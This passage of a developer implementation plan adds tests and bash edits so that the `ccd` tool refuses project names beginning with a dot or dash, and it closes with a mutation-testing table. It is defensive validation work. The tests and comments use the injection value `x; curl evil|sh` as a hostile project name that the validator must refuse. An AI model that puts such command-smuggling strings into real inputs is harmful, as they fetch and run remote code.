    expect(eventsOf(h.home, 'enable').map((e) => e['id'])).toEqual(['claude-b-demo']);
  }, 60_000);

  it('project-pool refuses a dash-leading project, and nothing lands under pools/', () => {
    fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
    const pools = h.sh('printf %s "$POOLS_DIR"');
    for (const argv of ['--project -lead --pool pool-a', '--project -lead --clear']) {
      const r = shFail(`cmd_project_pool ${argv}`);
      expect(r.code, argv).not.toBe(0);
      expect(r.stderr, argv).toContain("invalid project '-lead'");
    }
    expect(fs.existsSync(path.join(pools, '-lead')), 'a tag was written').toBe(false);
    // The CONTROL: the same verb tags a plain project at the path the assertion above reads.
    fs.mkdirSync(path.join(h.home, 'projects', 'demo'), { recursive: true });
    expect(h.sh('cmd_project_pool --project demo --pool pool-a')).toBe('tagged demo pool-a');
    expect(fs.readFileSync(path.join(pools, 'demo'), 'utf8')).toBe('pool-a');
  }, 60_000);

  it('each refusal says "no LEADING dot or dash"', () => {
    h.makeRepo('-lead');
    const SITES: readonly (readonly [string, string])[] = [
      ['ws-add', `${WS_ADD} cmd_ws_add -lead quiet-basin`],
      ['start', `${START_STUBS} cmd_start claude-b -lead`],
      ['enable', `${START_STUBS} cmd_enable claude-b -lead`],
      ['project-pool', 'cmd_project_pool --project -lead --pool pool-a'],
    ];
    for (const [verb, snippet] of SITES) {
      const r = shFail(snippet);
      expect(r.code, verb).not.toBe(0);
      expect(r.stderr, verb).toContain('and no LEADING dot or dash');
    }
  }, 60_000);

  it('_ws_tmproot_id_ok refuses -x-y and .x-y, and accepts demo-quiet-mesa', () => {
    const out = h.sh(`for i in demo-quiet-mesa p.v2-quiet-mesa -x-y .x-y --actor; do
  if _ws_tmproot_id_ok "$i"; then printf '%s ok\\n' "$i"; else printf '%s no\\n' "$i"; fi
done`);
    expect(out.split('\n')).toEqual(['demo-quiet-mesa ok', 'p.v2-quiet-mesa ok', '-x-y no', '.x-y no', '--actor no']);
  });

  it('_ws_tmproot_id_ok is derived from _reg_id_ok, so the dash rule has one spelling', () => {
    // A copy that spelled the dash rule inline (`!= [.-]*`) would answer every row above alike. Only this
    // line tells the derivation from a second spelling.
    const defs = fs.readFileSync(CCD, 'utf8').split('\n').filter((l) => l.startsWith('_ws_tmproot_id_ok() {'));
    expect(defs).toHaveLength(1);
    expect(defs[0]).toContain('_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }');
  });

  it('the collect audit dies "bad session id" for -x-y before anything is read, with no .reap-* lock', () => {
    // A witness-named file stands, so an id the predicate let through would go on to the population check and the lock.
    fs.mkdirSync(path.join(regDir(), 'tmproots'), { recursive: true });
    fs.writeFileSync(path.join(regDir(), 'tmproots', '-x-y'), 'junk\n');
    const r = shFail('cmd_ws_audit --session -x-y --collect');
    expect(r.code).toBe(1);
    expect(r.stdout).toBe('');
    expect(r.stderr).toContain('bad session id');
    expect(reapLocks()).toEqual([]);
  }, 60_000);

  it('_ws_tmproot_id_ok and isTmpRootId agree on every name except length', () => {
    const NAMES = ['demo-quiet-mesa', '.x-y', '-x-y', 'a/b', 'a b', '', 'a=b'] as const;
    const out = h.sh(`for i in ${NAMES.map((n) => `'${n}'`).join(' ')}; do
  if _ws_tmproot_id_ok "$i"; then printf 'ok\\n'; else printf 'no\\n'; fi
done`);
    const ccd = out.split('\n');
    expect(ccd, 'one answer per name').toHaveLength(NAMES.length);
    expect(Object.fromEntries(NAMES.map((n, i) => [n, ccd[i] === 'ok'])))
      .toEqual(Object.fromEntries(NAMES.map((n) => [n, isTmpRootId(n)])));
    // Guards the guard: the table holds an accepted name, so equality is not two all-false columns.
    expect(NAMES.filter((n) => isTmpRootId(n))).toEqual(['demo-quiet-mesa']);
    // THE ONE STATED DIFFERENCE, pinned so it stays the only one: the server bounds the length, and ccd's predicate does not.
    const long = `${'p'.repeat(250)}-quiet-mesa`;
    expect(h.sh(`_ws_tmproot_id_ok '${long}' && echo ok || echo no`)).toBe('ok');
    expect(isTmpRootId(long)).toBe(false);
  });
});
```

- [ ] **Step 2: Invert `server/test/pool-name-parity.test.ts`'s pinned acceptance of `-lead`**

(2a) The doctor sentence quoted in the header. Before:

```ts
//   "The charset is `_ws_project_valid`'s own … The charset is shared; the
//    leading-dash rule is this file's alone, and the parity test pins both
//    halves rather than trusting this sentence."
```

After. It quotes the doctor text as Step 5 leaves it:

```ts
//   "The charset is `_ws_project_valid`'s own (grep `_ws_project_valid`,
//    `^[A-Za-z0-9._-]+$`, no dot- or dash-leading), so no name `ccd` would
//    ever CREATE is omitted — a cross-file claim, and
//    `pool-name-parity.test.ts` measures it rather than trusting this
//    sentence."
```

(2b) The parenthetical's first two lines. Before:

```ts
// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and once claimed
// "no name `ccd` would ever CREATE is omitted". Both were wrong. The anchor
```

After:

```ts
// (THAT SENTENCE ONCE CARRIED A LINE ANCHOR, `ccd:3685`, and claimed "no name
// `ccd` would ever CREATE is omitted" while `ccd` still created `-lead`. Both
// were wrong then; path-identity W1b made the second true. The anchor
```

(2c) The findings paragraphs and the describe title. Before:

```ts
// WHAT THE MEASUREMENT FOUND IS NOT WHAT THE OLD SENTENCE
// SAID. The two filters agree on eight of the nine names below and disagree
// on the ninth: `-lead` is a name `ccd` DOES create — `_ws_project_valid`
// accepts it (`-` is in the charset, and only a leading DOT is refused), and
// `cmd_project_pool --project -lead --pool <p>` really writes the tag, both
// measured below — and the doctor omits it anyway. The second half of the
// same comment says so out loud ("A leading `-` is refused too: it is
// shell-safe but would be read by `ccd` as a flag"), so the filter is
// deliberate, not a drift; it is the summary clause that overstates.
//
// So the property pinned here is the TRUE one, and it is the one worth
// having: the doctor's filter is a SUBSET of `ccd`'s grammar. Every name it
// keeps is a name `ccd` would create, which is the safety direction — a
// remedy never prints a command for a name that could not be a project — and
// the only names it drops that `ccd` would keep are the leading-dash ones,
// which is exactly the `-*` arm. That second half is measured over the nine
// names below and no further — see that assertion's own note on what a table
// of nine does and does not establish. A charset that drifted in either file
// breaks the first half, in whichever direction it drifted.
describe('the project-name grammar is one grammar in two files (and the doctor is stricter by exactly one arm)', () => {
```

After:

```ts
// WHAT THE MEASUREMENT FINDS NOW (path-identity spec §2.4). Until path-identity
// W1b the two filters disagreed on one of the nine names below. `-lead` was a
// name `ccd` DID create: `_ws_project_valid` refused only a leading DOT, and
// `cmd_project_pool --project -lead --pool <p>` really wrote the tag. The
// doctor omitted it anyway. A dash-leading project is how `ccd` could mint an
// id spelled as a flag (project `-` with slug `actor` is `--actor`), so
// `_ws_project_valid` gained its own leading-dash line, SEPARATE from the
// charset line and the dot line, and the doctor's summary clause became true
// as written. Both halves are measured below: the table, and `ccd` refusing
// the tag.
//
// So two properties are pinned here. First, the doctor's filter is a SUBSET of
// `ccd`'s grammar. Every name it keeps is a name `ccd` would create, which is
// the safety direction: a remedy never prints a command for a name that could
// not be a project. Second, over the nine names below the two filters AGREE. A
// leading-dash line dropped from `ccd` brings `-lead` back as the one
// disagreement, which reds here even though the subset property stays green.
// That second half is measured over the nine names below and no further; see
// that assertion's own note on what a table of nine does and does not
// establish. A charset that drifted in either file breaks the first half, in
// whichever direction it drifted.
describe('the project-name grammar is one grammar in two files (and both refuse a leading dash, path-identity spec §2.4)', () => {
```

(2d) A new `it`, placed directly after the dot-leading case. Before:

```ts
    expect(ccdValidFn()).toContain('[[ "$1" != .* ]] || return 1');
    expect(omitPattern().split('|')).toContain('.*');
  });
```

After:

```ts
    expect(ccdValidFn()).toContain('[[ "$1" != .* ]] || return 1');
    expect(omitPattern().split('|')).toContain('.*');
  });

  it('ccd refuses a dash-leading name on a line of its own (path-identity spec §2.4)', () => {
    // SEPARATE, as the dot rule is. Folded into the charset line, the charset
    // read above stops matching. Folded into the dot line, a reader loses
    // which rule refused. The doctor's `-*` arm is pinned by the whole-list
    // case below.
    expect(ccdValidFn()).toContain('[[ "$1" != -* ]] || return 1');
  });
```

(2e) The exact table's comment and its `-lead` row. Before:

```ts
    // Measured, name by name, against the shipped bytes of both files. The
    // one row that is not agreement is `-lead`, and it is written out here
    // rather than excused in prose, so a change to EITHER file that moved it
    // — in either direction — is a red line an author has to look at.
```

After:

```ts
    // Measured, name by name, against the shipped bytes of both files. Every
    // row is agreement. `-lead` was the one disagreement until path-identity
    // W1b gave `_ws_project_valid` its dash line, and it is written out here
    // rather than excused in prose, so a change to EITHER file that moved it
    // — in either direction — is a red line an author has to look at.
```

and `      '-lead': 'accept omit',` becomes `      '-lead': 'refuse omit',`.

(2f) The disagreement case. Before:

```ts
  it('the only names they disagree on are the leading-dash ones', () => {
    // The exact size of the gap the summary clause in `_check_pools` glosses
    // over. A charset edit that made them disagree on one of these nine reds
    // here and names it — and it reds where the subset property above stays
    // GREEN, because that property is one-directional: a doctor getting
    // STRICTER cannot print a command it should not have, so it is safe and
    // invisible there, and this is the assertion that sees it.
    //
    // WHAT THIS DOES NOT ESTABLISH: nine names are a table, not a proof over
    // every string. It shows the two filters agreeing where the design says
    // they must and disagreeing only where the `-*` arm says they will; it
    // cannot show there is no third disagreement nobody thought to write
    // down. The charset equality above is the part that generalises.
    const rows = measurePair();
    const disagree = NAMES.filter((_, i) => rows[i] === 'accept omit' || rows[i] === 'refuse keep');
    expect(disagree).toEqual(['-lead']);
    expect(disagree.every((n) => n.startsWith('-'))).toBe(true);
  });
```

After:

```ts
  it('the two filters now disagree on none of the nine names', () => {
    // The exact size of the gap, which path-identity W1b closed: `ccd` and the
    // doctor both refuse a leading dash now. A charset edit, or a dash arm
    // dropped from either file, that made them disagree on one of these nine
    // reds here and names it. It reds where the subset property above stays
    // GREEN, because that property is one-directional: a doctor getting
    // STRICTER cannot print a command it should not have, so it is safe and
    // invisible there, and this is the assertion that sees it.
    //
    // WHAT THIS DOES NOT ESTABLISH: nine names are a table, not a proof over
    // every string. It shows the two filters agreeing where the design says
    // they must; it cannot show there is no disagreement nobody thought to
    // write down. The charset equality above is the part that generalises.
    const rows = measurePair();
    const disagree = NAMES.filter((_, i) => rows[i] === 'accept omit' || rows[i] === 'refuse keep');
    expect(disagree).toEqual([]);
    // Guards the guard: `toEqual([])` over a table that measured nothing would pass. Five names are
    // refused by ccd and omitted by the doctor, `-lead` among them.
    expect(NAMES.filter((_, i) => rows[i] === 'refuse omit')).toEqual(['.hidden', '-lead', 'x; curl evil|sh', 'x y', '']);
  });
```

(2g) The section comment and the "ccd really creates" case. Before:

```ts
  // ── the two ENDS of the claim, on real files ──────────────────────────
  // Everything above runs the two filters in isolation. These two prove the
  // filters are the ones the shipped tools actually use — that `-lead` is a
  // tag `ccd` will really create, and that `_check_pools` really keeps it and
  // the hostile name out of the printed command.
  it('ccd really creates a tag whose name the doctor will omit', () => {
    // Without this, "`-lead` is a name ccd would create" is a claim about a
    // function nobody proved is reached. `cmd_project_pool`'s arity `case`
    // binds `project=$2` positionally, so a leading dash is never read as a
    // flag on the way in — measured here, not reasoned about.
    const h = makeCcdHarness('ccrc-pool-dash-');
    try {
      fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
      expect(h.sh('cmd_project_pool --project -lead --pool pool-a')).toBe('tagged -lead pool-a');
      const p = path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead');
      expect(fs.readFileSync(p, 'utf8')).toBe('pool-a');
    } finally {
      h.cleanup();
    }
  });
```

After:

```ts
  // ── the two ENDS of the claim, on real files ──────────────────────────
  // Everything above runs the two filters in isolation. These prove the
  // filters are the ones the shipped tools actually use: `ccd` really refuses
  // `-lead` and the hostile name, and `_check_pools` really keeps both out of
  // the printed command.
  it('ccd refuses to create a tag whose name the doctor would omit', () => {
    // Without this, "ccd refuses `-lead`" is a claim about a function nobody
    // proved is reached. `cmd_project_pool`'s arity `case` binds `project=$2`
    // positionally, so a leading dash is never read as a flag on the way in.
    // The refusal is `_ws_project_valid`'s dash line, measured here, not
    // reasoned about (path-identity spec §2.4).
    const h = makeCcdHarness('ccrc-pool-dash-');
    try {
      fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
      let stderr = '';
      let threw = false;
      try {
        h.sh('cmd_project_pool --project -lead --pool pool-a');
      } catch (err) {
        threw = true;
        stderr = String((err as { stderr?: string }).stderr ?? '');
      }
      expect(threw, 'cmd_project_pool tagged a dash-leading project').toBe(true);
      expect(stderr).toContain("invalid project '-lead'");
      // And nothing landed: the refusal is BEFORE the filesystem.
      expect(fs.existsSync(path.join(h.home, '.cc-sessions', POOLS_DIR_NAME, '-lead'))).toBe(false);
    } finally {
      h.cleanup();
    }
  });
```

(2h) The hostile-name case's opening comment. Before:

```ts
    // The negative arm the positive one above cannot supply. A second,
    // looser `_ws_project_valid` appended to `ccd/ccd` in a spelling the
    // scan misses would still create `-lead` happily — measured — so
    // "ccd would never create this name" needs a name the gate must REFUSE,
    // run against the shipped file. `x; curl evil|sh` is the doctor's own
```

After:

```ts
    // The charset's negative arm, beside the dash one above. A second,
    // looser `_ws_project_valid` appended to `ccd/ccd` in a spelling the
    // scan misses would still create names the shipped one refuses (it
    // created `-lead` happily, measured before the dash line), so
    // "ccd would never create this name" needs a name the gate must REFUSE,
    // run against the shipped file. `x; curl evil|sh` is the doctor's own
```

(2i) `server/test/ccd-project-pool.test.ts`: the `enable` case that the wrapper check inverts. Today it pins that `cmd_enable --cross-pool demo pool-a` journals `enable` for `demo-pool-a` before `cmd_start` refuses the unrostered wrapper `demo`. Step 4g refuses before that line. Find the case by its title, `a leading --cross-pool on \`enable\` now journals the REAL id, because the strip runs before \`_id\``. Replace the whole case, from its `it(` line through its closing `});` and its comment included, with:

```ts
  it('a leading --cross-pool on `enable` is stripped before the wrapper check, which refuses the REAL wrapper before any journal line', () => {
    // MEASURED when `cmd_enable`'s own strip moved ABOVE `_id "$1" "$2"`: with
    // the flag gone from argv, `_id demo pool-a` is `demo-pool-a`, never the
    // bogus `--cross-pool-demo`.
    //
    // WHICH CHECK REFUSES changed in path-identity W1b (path-identity spec
    // §2.4): `cmd_enable`'s two-argument form now asks `cmd_start`'s own
    // wrapper check, words and all, BEFORE its `enable` line, so the refused
    // `demo` leaves no row at all. The stderr line still proves the strip:
    // unstripped, the wrapper would be the flag itself, and the refusal would
    // name `--cross-pool`.
    const r = shFail('cmd_enable --cross-pool demo pool-a');
    expect(r.code).not.toBe(0);
    expect(r.stderr).toContain("unknown wrapper 'demo'");
    const lcDir = path.join(REG(), '.lifecycle');
    const journal = fs.existsSync(lcDir)
      ? fs.readdirSync(lcDir).map((f) => fs.readFileSync(path.join(lcDir, f), 'utf8')).join('\n')
      : '';
    expect(journal, 'no row for the bogus id').not.toContain('"id":"--cross-pool-demo"');
    expect(journal, 'and none for the refused one').not.toContain('"id":"demo-pool-a"');
  });
```

- [ ] **Step 3: Run them RED**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ccd-project-pool.test.ts
```

Expected: FAIL. These are drafted predictions; record the measured text in the ledger.
- `ccd-project-dash.test.ts`: 11 failed of 11.
  - `-lead accept` and `--reason accept`.
  - ws-add, start, enable and project-pool for `-lead` exit 0 (`expected 0 not to be 0`). Project-pool prints `tagged -lead pool-a`.
  - "each refusal": ws-add exits 0.
  - The wrapper case: `acct-unrostered: a journal row names the id`, with `unarchive` and `enable` rows for `acct-unrostered-demo`, because the expiry gate and enable's journal line run before `cmd_start` refuses the wrapper.
  - `-x-y ok`.
  - The derivation pin: `expected undefined to contain …`, or the old body.
  - The collect audit exits 0 or 1 with a JSON document on stdout, and creates `.reap--x-y.lock` where `mv --no-copy` exists.
  - Parity: `"-x-y": true` against `false`.
- `pool-name-parity.test.ts`: 4 failed.
  - The exact table: `'-lead': 'accept omit'` against `'refuse omit'`.
  - "disagree on none": `[ '-lead' ]` against `[]`.
  - The dash-line case.
  - "ccd refuses to create": `threw` is false.
- `ccd-project-pool.test.ts`: 1 failed, the rewritten `enable` case: `and none for the refused one: expected '…"id":"demo-pool-a"…' not to contain '"id":"demo-pool-a"'`. Today enable journals that row before `cmd_start` refuses `demo`.

A different count is not a departure. A case that is GREEN here is: name it by slug and STOP.

- [ ] **Step 4: Implement in `ccd/ccd`**, each edit located by its quoted content.

(4a) The creation-sites header, line for line. Before:

```bash
# Enforced at CREATION ONLY — `cmd_ws_add` and `cmd_start`, the two sites
# that mint a NEW registry row for a project — never at `cmd_pr_state`,
```

After:

```bash
# Enforced at CREATION ONLY — `cmd_ws_add`, `cmd_start` and `cmd_enable`, the
# sites that mint a NEW registry row for a project — never at `cmd_pr_state`,
```

(4b) `_ws_project_valid`: seven comment lines fold to six, and the dash line goes in. The function keeps 17 lines. Before:

```bash
  # THE ASYMMETRY IS WHY IT MATTERS HERE RATHER THAN SOMEDAY. The reader is now
  # locale-independent; this gate was not. A project tagged from an interactive
  # shell (`LANG=en_US.UTF-8`) could then not be CLEARED from the fleet's own
  # `claude-session@*` environment, which carries no `LANG` at all: the tag
  # keeps constraining placement and `ccd project-pool --clear` refuses the very
  # name that created it. A constraint you can create and cannot remove with the
  # supported verb is worse than either locale's behaviour on its own.
  local LC_ALL=C
  [[ "$1" =~ ^[A-Za-z0-9._-]+$ ]] || return 1
  [[ "$1" != .* ]] || return 1
}
```

After:

```bash
  # THE ASYMMETRY IS WHY IT MATTERS HERE RATHER THAN SOMEDAY. The reader is now
  # locale-independent; this gate was not, so a project tagged from a `LANG=en_US.UTF-8`
  # shell could not be CLEARED from `claude-session@*`'s LANG-less environment: the tag
  # kept constraining placement and `ccd project-pool --clear` refused its own name. A
  # constraint you can create and cannot remove is worse than either locale alone.
  # NO LEADING DASH (path-identity spec §2.4): a dash-leading project mints a flag-spelled id.
  local LC_ALL=C
  [[ "$1" =~ ^[A-Za-z0-9._-]+$ ]] || return 1
  [[ "$1" != .* ]] || return 1
  [[ "$1" != -* ]] || return 1
}
```

(4c) `cmd_ws_add`'s die, in place. Before:

```bash
    || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot (a dot-leading id aliases ccd's own hidden registry files — see _ws_project_valid)"
```

After:

```bash
    || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash (a dot-leading id aliases ccd's own hidden registry files, a dash-leading one spells a flag — see _ws_project_valid)"
```

(4d) `cmd_project_pool`'s die, in place. Before:

```bash
    || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot (the tag is a file in $POOLS_DIR, whose dot-leading names are its tmp namespace)"
```

After:

```bash
    || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash (the tag is a file in $POOLS_DIR, whose dot-leading names are its tmp namespace)"
```

(4e) `_ws_tmproot_id_ok`, re-derived. Two comment lines stay two, and the heading phrase stays first on its line. Before:

```bash
# THE ID A WITNESS MAY BE NAMED FOR: the tail's own id shape, never
# dot-leading — `.`, `..` and the writer's `.<id>.*.tmp` names live there.
_ws_tmproot_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]; }
```

After:

```bash
# THE ID A WITNESS MAY BE NAMED FOR (path-identity spec §2.4): an id `_reg_id_ok` accepts, so never
# dash-leading, and never dot-leading either — `.`, `..` and the writer's `.<id>.*.tmp` names live there.
_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 iff a witness, a token verb or its audit may name it
```

(4f) `cmd_start`'s die, in place. Before:

```bash
      || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot"
```

After:

```bash
      || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"
```

(4g) `cmd_enable` asks the wrapper and the project before it journals (R11; the wrapper half by coordinator ruling). Before:

```bash
  local id; if [[ $# -ge 2 ]]; then id=$(_id "$1" "$2"); else id="$1"; fi
  # TWO EVENTS, NOT ONE. `cmd_start` runs in THIS process and writes its own
```

After:

```bash
  local id; if [[ $# -ge 2 ]]; then id=$(_id "$1" "$2"); else id="$1"; fi
  # THE WRAPPER AND THE PROJECT ARE ASKED BEFORE ANYTHING IS JOURNALED (path-identity spec §2.4). `cmd_start`
  # refuses both, but only after the expiry gate's lock and this verb's `enable` line, which would then name an
  # id nothing created. The wrapper check is `cmd_start`'s own, words and all; `_ws_project_valid` is the
  # creation sites' one rule for a project: no leading dot or dash.
  if [[ $# -ge 2 ]]; then
    _is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"
    _ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"
  fi
  # TWO EVENTS, NOT ONE. `cmd_start` runs in THIS process and writes its own
```

- [ ] **Step 5: `ccd/ccrc-doctor-checks`, in `_check_pools`'s comment (six lines stay six).** Before:

```bash
    # project-pool --project x; curl evil|sh --clear`. The charset is
    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
    # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
    # trusting this sentence. A leading `-` is refused too: it is shell-safe
    # but would be read by `ccd` as a flag, not as the project.
```

After:

```bash
    # project-pool --project x; curl evil|sh --clear`. The charset is
    # `_ws_project_valid`'s own (grep `_ws_project_valid`, `^[A-Za-z0-9._-]+$`,
    # no dot- or dash-leading), so no name `ccd` would ever CREATE is omitted — a
    # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
    # trusting this sentence. A leading `-` is refused too: it is shell-safe
    # but would be read by `ccd` as a flag, not as the project.
```

- [ ] **Step 6: `server/test/ccd-workspaces.test.ts`, one comment line in place.** Before:

```ts
    // `_ws_project_valid` accepts, so the verb would die at the not-a-git-repo
```

After:

```ts
    // `_ws_project_valid` refuses (a leading dash), so the verb would die at its
```

The next line, `// check long before the slug gate and this test would pass for the wrong`, is unchanged and still continues the sentence.

- [ ] **Step 7: Restamp and check the syntax**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "rc=$?"   # rc=0
bash -n ccd/ccrc-doctor-checks; echo "rc=$?"                                                             # rc=0
awk '/^_ws_project_valid\(\) \{/{s=NR} s&&/^}$/{print NR-s+1; exit}' ccd/ccd                              # 17
git show origin/main:ccd/ccd | awk '/^_ws_project_valid\(\) \{/{s=NR} s&&/^}$/{print NR-s+1; exit}'       # 17
grep -cF 'no LEADING dot or dash' ccd/ccd                                                                 # 4: ws-add, project-pool, start, enable
awk '/^cmd_enable\(\) \{/{f=1} f&&/_is_valid_wrapper "\$1"/{print "wrap " NR} f&&/_ws_project_valid "\$2"/{print "proj " NR} f&&/^  _ws_expire_refuse_return "\$id" enable/{print "exp " NR; exit}' ccd/ccd   # wrap < proj < exp
```

- [ ] **Step 8: Run them GREEN**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ccd-project-pool.test.ts test/ownership.test.ts test/mark-check.test.ts
```

Expected: PASS, with 11 of 11 in `ccd-project-dash.test.ts`.

- [ ] **Step 9: The mutation table.**
- Save the green copy first: `S=$(mktemp -d) && cp ccd/ccd "$S/ccd.task5"`.
- Apply each mutation alone and run its command from `server/`.
- Restore with `cp "$S/ccd.task5" ccd/ccd`. Then `node shared/mark.mjs --check ccd/ccd` exits 0, which proves the bytes are the restamped ones.
- Every red text below was drafted, not measured. Record the measured text in the ledger.

| # | Mutation (exact edit in `ccd/ccd`) | Command | Expected red |
|---|---|---|---|
| T5.1 | Delete the line `  [[ "$1" != -* ]] \|\| return 1` in `_ws_project_valid` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts` | ccd-project-dash: the `_ws_project_valid` row (`'-lead accept'`), and the ws-add, start, enable, project-pool and "each refusal" rows (exit 0, or an `enable` row journaled). pool-name-parity: the exact table (`'accept omit'`), "disagree on none" (`[ '-lead' ]`), the dash-line case, and "ccd refuses to create" (`threw` false). The three `_ws_tmproot_id_ok` rows and the collect-audit row stay GREEN, because their dash rule is `_reg_id_ok`'s. |
| T5.2 | In `cmd_enable`, replace the line `    _ws_project_valid "$2" \|\| die "invalid project '$2' — …"` with `    :` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts -t 'enable refuses'` | `-lead: a journal row names the id: expected [ { act: 'unarchive', id: 'claude-b--lead', … }, { act: 'enable', id: 'claude-b--lead', … } ] to deeply equal []`: the expiry gate clears the planted archive under a reap lock before enable journals |
| T5.3 | Restore `_ws_tmproot_id_ok`'s old body: `_ws_tmproot_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]; }` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts -t '_ws_tmproot_id_ok\|collect audit'` | The refuses row (`'-x-y ok'`); the derivation pin; the collect-audit row (exit not 1, or a document on stdout, and `.reap--x-y.lock` where `mv --no-copy` exists); parity (`"-x-y": true` against `false`) |
| T5.4 | Drop the dot clause: `_ws_tmproot_id_ok() { _reg_id_ok "${1-}"; }` | same | The refuses row (`'.x-y ok'`); the derivation pin; parity (`".x-y": true` against `false`) |
| T5.5 | Fold the dash rule into the charset line: replace `  [[ "$1" =~ ^[A-Za-z0-9._-]+$ ]] \|\| return 1` with `  [[ "$1" =~ ^[A-Za-z0-9._-]+$ && "$1" != -* ]] \|\| return 1`, and delete the separate dash line | `./node_modules/.bin/vitest run test/pool-name-parity.test.ts` | "both files spell one charset": `_ws_project_valid no longer holds an anchored ^[…]+$ test on "$1": expected undefined to be truthy`. The dash-line case: `expected '…' to contain '[[ "$1" != -* ]] \|\| return 1'`. `ccd-project-dash` stays GREEN, because the behaviour is identical; that is why the text pin exists. |
| T5.6 | Restore `cmd_start`'s die text to `…, and no LEADING dot"` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts -t 'no LEADING dot or dash'` | `start: expected '…and no LEADING dot\n' to contain 'and no LEADING dot or dash'` |
| T5.7 | Restore `cmd_ws_add`'s die text to `…, and no LEADING dot (a dot-leading id aliases ccd's own hidden registry files — see _ws_project_valid)"` | same | `ws-add: expected '…' to contain 'and no LEADING dot or dash'` |
| T5.8 | Insert one blank line inside `_ws_project_valid`, directly after `  local LC_ALL=C` | `./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT\|README HAS ITS OWN CENSUS\|LOCATION INDEXES\|ROW PASS\|RANGE BOUND\|backticked _identifier'` | At least one census pass reds: the corpus cites lines below the function, which move. Measure once. If every pass stays green, report `census-blind-at-ws-project-valid` in the wave-done. |
| T5.9 | Move Task 5's four-line `if [[ $# -ge 2 ]]; then … fi` block in `cmd_enable` from directly after the `local id` line to directly after the `  _ws_expire_refuse_return "$id" enable` line, so it still precedes `_lc_done enable` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts -t 'enable refuses'` | `-lead: a journal row names the id`: an `unarchive` row, written by the expiry gate the check now follows. Past it, the planted archive marker is gone and `.reap-claude-b--lead.lock` stands. The wrapper case reds alike (`acct-unrostered: a journal row names the id`). The checks must precede that gate, because the gate opens a permanent reap lock for an archived id |
| T5.10 | In `cmd_enable`, replace the line `    _is_valid_wrapper "$1" \|\| die "unknown wrapper '$1' …"` with `    :` | `./node_modules/.bin/vitest run test/ccd-project-dash.test.ts -t 'enable refuses an unrostered'` | `acct-unrostered: a journal row names the id: expected [ { act: 'unarchive', id: 'acct-unrostered-demo', … }, { act: 'enable', id: 'acct-unrostered-demo', … } ] to deeply equal []`: the project check passes `demo`, so the expiry gate and enable's journal line run before `cmd_start` refuses the wrapper. The stderr assertion stays GREEN, because `cmd_start`'s refusal carries the same words |

In the table, `\|` is a Markdown table escape, in the mutation text and in the `-t` filters alike: type a plain `|`. Typed as `\|`, a `-t` filter matches no title, every case is skipped, and the row reads green.

After the last mutation, restore once more and re-run Step 8's command: green. Then `rm -rf "$S"`.

- [ ] **Step 10: The gates (unedited files run whole; foreground, timeout at least 600000 ms)**

```bash
cd server && ./node_modules/.bin/vitest run test/pool-name-parity.test.ts test/pool-tag-parity.test.ts test/project-pools-read.test.ts \
  test/ccd-collect-race-ids.test.ts test/ccd-workspaces.test.ts test/ccd-project-pool.test.ts test/ccd-start-id.test.ts \
  test/ccd-crosspool.test.ts test/ccd-lifecycle-sites.test.ts test/ccd-die-containment.test.ts test/ccd-supervised-start.test.ts \
  test/ccrc-doctor.test.ts test/ccd-refusal-scan.test.ts test/collect-readers.test.ts test/ownership.test.ts test/mark-check.test.ts
cd server && ./node_modules/.bin/vitest run test/ccd-reg-id-ok.test.ts test/ccd-token-verbs-dash-id.test.ts test/ccd-stop-dash-id.test.ts test/ccd-session-verbs-dash-id.test.ts
cd server && ./node_modules/.bin/vitest run ccd-collect- ccd-ws-collect- ccd-child-tmproot-witness ccd-child-tmpdir ccd-leaf-remove
cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'
cd server && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts
```

From the workspace root:

```bash
for f in _ws_project_valid cmd_ws_add cmd_project_pool; do
  echo "$f origin=$(git show origin/main:ccd/ccd | grep -n "^$f() {" | cut -d: -f1) head=$(grep -n "^$f() {" ccd/ccd | cut -d: -f1)"
done                                                                         # origin equals head on each line
git diff --quiet -- server/test/session-hook.test.ts && echo "census numbers unedited"
git status --porcelain                                                       # exactly the six paths Step 11 adds
```

Expected: every suite PASSES, and the five citation passes are green with no number edited.
